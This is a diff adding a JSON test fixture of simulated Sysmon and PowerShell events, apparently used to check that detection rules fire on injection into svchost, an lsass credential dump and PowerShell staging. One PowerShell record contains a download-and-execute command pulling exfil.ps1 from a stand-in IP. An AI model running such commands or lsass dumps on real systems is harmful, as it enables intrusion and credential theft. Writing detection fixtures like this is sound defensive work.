@@ -1,0 +1,83 @@
+[
+  {
+    "_stage": "1-injection",
+    "_expect_rule": 100921,
+    "win": {
+      "system": {
+        "providerName": "Microsoft-Windows-Sysmon",
+        "eventID": "8",
+        "systemTime": "2026-09-05T11:00:00.000Z",
+        "eventRecordID": "51000",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "computer": "WIN-DC01.corp.local",
+        "severityValue": "INFORMATION",
+        "message": "CreateRemoteThread detected:"
+      },
+      "eventdata": {
+        "utcTime": "2026-09-05 11:00:00.000",
+        "sourceProcessGUID": "{9f2a1e3c-4000-6710-0301-000000002200}",
+        "sourceProcessId": "7788",
+        "sourceImage": "C:\\Windows\\Temp\\loader.exe",
+        "targetProcessGUID": "{9f2a1e3c-0800-6710-0000-000000000800}",
+        "targetProcessId": "2244",
+        "targetImage": "C:\\Windows\\System32\\svchost.exe",
+        "newThreadId": "8871",
+        "startAddress": "0x000002AB4D110000",
+        "startModule": "",
+        "startFunction": ""
+      }
+    }
+  },
+  {
+    "_stage": "2-lsass-dump",
+    "_expect_rule": 100941,
+    "win": {
+      "system": {
+        "providerName": "Microsoft-Windows-Sysmon",
+        "eventID": "10",
+        "systemTime": "2026-09-05T11:00:30.000Z",
+        "eventRecordID": "51002",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "computer": "WIN-DC01.corp.local",
+        "severityValue": "INFORMATION",
+        "message": "Process accessed:"
+      },
+      "eventdata": {
+        "utcTime": "2026-09-05 11:00:30.000",
+        "sourceProcessGUID": "{9f2a1e3c-4000-6710-0301-000000002200}",
+        "sourceProcessId": "7788",
+        "sourceImage": "C:\\Windows\\Temp\\loader.exe",
+        "targetProcessGUID": "{9f2a1e3c-2f10-6710-0000-001000000200}",
+        "targetProcessId": "672",
+        "targetImage": "C:\\Windows\\System32\\lsass.exe",
+        "grantedAccess": "0x1010",
+        "callTrace": "C:\\Windows\\SYSTEM32\\ntdll.dll+9c534|C:\\Windows\\Temp\\loader.exe+2010",
+        "sourceUser": "CORP\\svc-helpdesk",
+        "targetUser": "NT AUTHORITY\\SYSTEM"
+      }
+    }
+  },
+  {
+    "_stage": "3-powershell-staging",
+    "_expect_rule": 100942,
+    "win": {
+      "system": {
+        "providerName": "Microsoft-Windows-PowerShell",
+        "eventID": "4104",
+        "systemTime": "2026-09-05T11:02:00.000Z",
+        "eventRecordID": "91500",
+        "channel": "Microsoft-Windows-PowerShell/Operational",
+        "computer": "WIN-DC01.corp.local",
+        "severityValue": "INFORMATION",
+        "message": "Creating Scriptblock text"
+      },
+      "eventdata": {
+        "messageNumber": "1",
+        "messageTotal": "1",
+        "scriptBlockText": "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://203.0.113.55/exfil.ps1')",
+        "scriptBlockId": "aa11bb22-3344-4a3b-9e21-abc123456789",
+        "path": ""
+      }
+    }
+  }
+]
